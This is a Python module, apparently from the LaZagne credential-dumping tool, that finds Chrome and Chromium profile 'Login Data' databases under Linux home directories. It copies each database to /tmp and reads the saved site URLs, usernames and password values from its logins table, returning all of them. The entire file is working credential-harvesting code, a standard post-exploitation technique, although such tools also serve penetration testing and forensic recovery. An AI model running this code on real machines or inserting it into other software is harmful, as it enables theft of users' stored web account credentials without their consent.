#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import shutil
import sqlite3
import os

# For non-keyring storage
from lazagne.config.module_info import ModuleInfo
from lazagne.config import homes


class Chrome(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'chrome', 'browsers')

    def get_paths(self):
        for profile_dir in homes.get(directory=[u'.config/google-chrome', u'.config/chromium']):
            try:
                subdirs = os.listdir(profile_dir)
            except Exception:
                continue

            for subdir in subdirs:
                login_data = os.path.join(profile_dir, subdir, 'Login Data')
                if os.path.isfile(login_data):
                    yield login_data

    def get_passwords(self, path):
        try:
            conn = sqlite3.connect(path)
        except Exception:
            return

        cursor = conn.cursor()
        try:
            cursor.execute('SELECT origin_url,username_value,password_value FROM logins')
            for url, user, password in cursor:
                yield {
                    'URL': url,
                    'Login': user,
                    'Password': password
                }
        except Exception as e:
            self.debug(e)

        finally:
            cursor.close()
            conn.close()
            os.remove(path)

    def run(self):
        all_passwords = []

        for path in self.get_paths():
            tmp = u'/tmp/chrome.db'
            shutil.copyfile(path, tmp)

            for pw in self.get_passwords(tmp):
                all_passwords.append(pw)

        return all_passwords
